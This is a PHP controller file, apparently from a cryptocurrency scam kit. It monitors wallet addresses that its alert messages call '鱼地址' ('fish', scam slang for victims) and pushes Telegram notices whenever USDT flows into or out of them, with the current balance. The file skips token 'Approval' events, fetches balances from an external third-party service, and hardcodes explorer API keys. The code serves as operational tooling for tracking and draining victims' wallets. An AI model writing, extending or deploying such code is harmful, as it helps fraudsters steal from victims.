<?php

namespace app\shop\controller;

use think\Cache;
use think\Db;

class Listen extends Base{
    
    public function listenBalance(){
        $time = time() * 1000;
        $where = array(
                'status' => 1,
            
            );
        $addresses =  Db::name('listen')->where('status',1)->select();
        
        foreach ($addresses as $key => $val){
            if($val['type'] == 'trc'){
                
                $this->trcNotice($val,$time);
                
            }else if($val['type'] == 'erc'){
                
                $this->ercNotice($val);
                
            }else if($val['type'] == 'bsc'){
                
                $this->bscNotice($val);
                
            }else if($val['type'] == 'okc'){
                
                $this->okcNotice($val);
                
            }
        }
    }
    
    private function trcNotice($val,$time){
        
        $bizhong = array(
                'USDT' => 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            
            );
        
        $url = "https://api.trongrid.io/v1/accounts/{$val['address']}/transactions/trc20?min_timestamp={$val['token']}&contract_address={$bizhong[$val['bizhong']]}";

        $results = hmCurl($url);
        $results = json_decode($results,true);
        
        if(isset($results['data']) && !empty($results['data'])){

            foreach ($results['data'] as $result){

                if($result['type'] == 'Approval') continue;
                
                if($result['to'] == $val['address']){

                    $balance = $this->getBalance($val['address'],'trc',$val['bizhong']);
                    $toBalance = $result['value'] / 1000000;
                    
                    $text = "【TRC转入】\n鱼地址：{$val['address']} \n转入金额：{$toBalance} {$val['bizhong']} \n钱包余额：{$balance} {$val['bizhong']}";
                    $this->sendMsg($text);
                    
                   
                    
                    $data = array(
                            'id' => $val['id'],
                            'token' => $time
                        );
                    
                    Db::name('listen')->update($data);
                    
                }else{

                    $balance = $this->getBalance($val['address'],'trc',$val['bizhong']);
                    $fromBalance = $result['value'] / 1000000;
                    
                    $text = "【TRC转出】\n鱼地址：{$val['address']} \n转出金额：{$fromBalance} {$val['bizhong']} \n钱包余额：{$balance} {$val['bizhong']}";
                    $this->sendMsg($text);
                    
                    $data = array(
                            'id' => $val['id'],
                            'token' => $time
                        );
                    
                    Db::name('listen')->update($data);
                }
            }
            
        }
    }
    
    
    public function addListen($address,$type,$bi = 'USDT'){
        
        if($type == 'trc'){
            
            $token = time() * 1000;
            
        }else if($type == 'erc'){
            
            $url = "https://api.etherscan.io/api?module=proxy&action=eth_blockNumber&apikey=SA5UJKGAJ9AV272SF4DBVMG19VR5VMASWG";
            
            $result = hmCurl($url);
            $result = json_decode($result,true);

            if(isset($result['result'])){
                $token = hexdec($result['result']);
            }else{
                $token = 0;
            }
            
        }else if($type == 'bsc'){
            
            $url = "https://api.bscscan.com/api?module=proxy&action=eth_blockNumber&apikey=ZXCBMPZ6WBJ9CR1IRZGP143EVAHUMEZ9W5";
            
            $result = hmCurl($url);
            $result = json_decode($result,true);

            if(isset($result['result'])){
                $token = hexdec($result['result']);
            }else{
                $token = 0;
            }
            
        }
        
        
        $data =array(
            
            'address' => $address,
            'token' => $token,
            'type'      => $type,
            'bizhong'   => $bi,
            'status'    => 1
            
        );
            
       $result = Db::name('listen')->where(['address' => $address,'bizhong' => $bi])->select();

       if(!empty($result)){
           exit('地址已存在！');
       }
       
       $result = Db::name('listen')->insert($data);
       
       if(isset($result)){
           echo '添加成功！';
       }
       
       
    }
    
    
    public function sendMsg($text){

        $payInfo = Db::name("pay")->where("type","usdtpay")->find();
        $telegramInfo = json_decode($payInfo['value'],true);
        
        $token = $telegramInfo['token'];
        $chat_id = $telegramInfo['chat_id'];
        
        $data = array(
                "chat_id" => $chat_id,
                'text'    => $text,
                'parse_mode'    => 'HTML'
            
            );

        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        
        $result = hmCurl($url,$data,1);
        $result = json_decode($result,true);
        
        
        if(isset($result) && empty($result['ok'])){
           if($result['error_code'] == 401 || $result['error_code'] == 404){
			   echo "token配置错误";
		   }elseif($result['error_code'] == 400){
			   echo "chat_id配置错误";
		   } 
        }else if(empty($result)){
            echo "未知错误！";
        }

    }
    
    public function getBalance($address,$type,$bi){
         $url = "https://check.coinservapi.com/checkBalance?address={$address}&type={$type}&bi={$bi}";
         $result = hmCurl($url);

         $result = json_decode($result,true);
        
         if($result['code'] == 1){
                $balance = $result['balance'];
                return $balance;
         }else{
             return '余额获取失败';
         }        
         
    }
    
} 



?>